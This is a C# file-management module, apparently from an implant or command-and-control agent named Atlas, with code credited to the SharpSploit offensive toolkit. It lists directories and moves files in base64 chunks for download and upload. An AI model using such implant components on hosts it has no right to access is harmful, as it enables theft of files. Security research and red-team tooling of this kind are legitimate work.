using System;
using System.IO;

namespace Atlas {
    class FileManagement {
        // Most of this code is directly from SharSploit: https://github.com/cobbr/SharpSploit
        public static Messages.DirectoryList DirectoryListing(string Path)
        {
            Messages.DirectoryList results = new Messages.DirectoryList();
            if (File.Exists(Path))
            {
                FileInfo fileInfo = new FileInfo(Path);
                results.directory_list.Add(new Messages.FileSystemEntry
                {
                    file_name = fileInfo.FullName,
                    size = (int)fileInfo.Length,
                    timestamp = fileInfo.LastWriteTimeUtc.ToString(),
                    IsDir = "false"
                });
            }
            else
            {
                foreach (string dir in Directory.GetDirectories(Path))
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(dir);
                    results.directory_list.Add(new Messages.FileSystemEntry
                    {
                        file_name = dirInfo.FullName,
                        size = 0,
                        timestamp = dirInfo.LastWriteTimeUtc.ToString(),
                        IsDir = "true"
                    });
                }
                foreach (string file in Directory.GetFiles(Path))
                {
                    FileInfo fileInfo = new FileInfo(file);
                    results.directory_list.Add(new Messages.FileSystemEntry
                    {
                        file_name = fileInfo.FullName,
                        size = (int)fileInfo.Length,
                        timestamp = fileInfo.LastWriteTimeUtc.ToString(),
                        IsDir = "false"
                    });
                }
            }
            return results;
        }

        public static class Download
        {
            public static ulong GetTotalChunks(string File)
            {
                var fi = new FileInfo(File);
                ulong total_chunks = (ulong)(fi.Length + Config.ChunkSize - 1) / (ulong)Config.ChunkSize;
                return total_chunks;
            }

            public static long GetFileSize(string File)
            {
                var fi = new FileInfo(File);
                return fi.Length;
            }

            public static string GetPath(string File)
            {
                return Path.GetFullPath(File);
            }

            public static string GetChunk(string File, int ChunkNum, int TotalChunks, long FileSize)
            {
                try
                {
                    byte[] file_chunk = null;
                    long pos = ChunkNum * Config.ChunkSize;
                    using (FileStream fileStream = new FileStream(File, FileMode.Open))
                    {
                        fileStream.Position = pos;
                        if (TotalChunks == ChunkNum + 1)
                        {
                            file_chunk = new byte[FileSize - (ChunkNum * Config.ChunkSize)];
                            int chunk_size = file_chunk.Length;
                            fileStream.Read(file_chunk, 0, chunk_size);
                        }
                        else
                        {
                            file_chunk = new byte[Config.ChunkSize];
                            fileStream.Read(file_chunk, 0, Config.ChunkSize);
                        }
                    }
                    return Convert.ToBase64String(file_chunk);
                }
                catch
                {
                    return "Error reading file";
                }
            }
        }

        public static bool Upload(string File, string ChunkData)
        {
            try
            {
                byte[] chunk_data = Convert.FromBase64String(ChunkData);
                using (FileStream fileStream = new FileStream(File, FileMode.Append))
                {
                    fileStream.Write(chunk_data, 0, chunk_data.Length);
                }
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}